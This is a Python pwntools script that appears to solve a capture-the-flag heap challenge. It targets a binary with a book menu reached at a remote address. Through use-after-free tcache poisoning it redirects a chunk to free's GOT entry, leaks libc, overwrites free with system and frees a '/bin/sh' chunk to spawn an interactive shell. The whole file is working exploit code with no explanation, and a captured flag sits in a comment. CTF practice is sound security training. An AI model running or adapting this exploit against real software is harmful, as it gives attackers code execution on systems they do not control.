#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./task")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

sshc = None
r = None
nc = "nc 34.155.40.100 1235"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0.1

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def newBook(size):
    sendl(1)
    sendl(size)


def editBook(idx, content):
    sendl(2)
    sendl(idx)
    send(content)


def delBook(idx):
    sendl(3)
    sendl(idx)


def showBook(idx):
    sendl(4)
    sendl(idx)
    r.recvuntil(b"OUTPUT: ")
    leak = r.recvuntil(b"1- ")[:-3]
    return leak


def exitProc():
    sendl(5)


def main():
    global r
    r = conn()
    
    SIZE = 32
    
    newBook(SIZE)
    newBook(SIZE)
    
    delBook(1)
    
    editBook(1, p64(exe.got.free&0xFFFFFFFFFFFFFFF0))
    
    newBook(SIZE)
    newBook(SIZE)
    
    editBook(3, "a"*15+"\n")
    leak = u64(showBook(3).split(b"\n")[1].ljust(8, b"\0"))
    logh("libc leak", leak)
    
    libc_base = leak - libc.symbols.puts
    logh("libc base", libc_base)
    
    editBook(3, b"a"*8 + p64(libc_base + libc.symbols.system))
    editBook(2, "/bin/sh\0")
    delBook(2)
    r.interactive() # FLAG{h3ap_eXpl0iT5_4r3_s0o0o0_fuN}


if __name__ == "__main__":
    main()

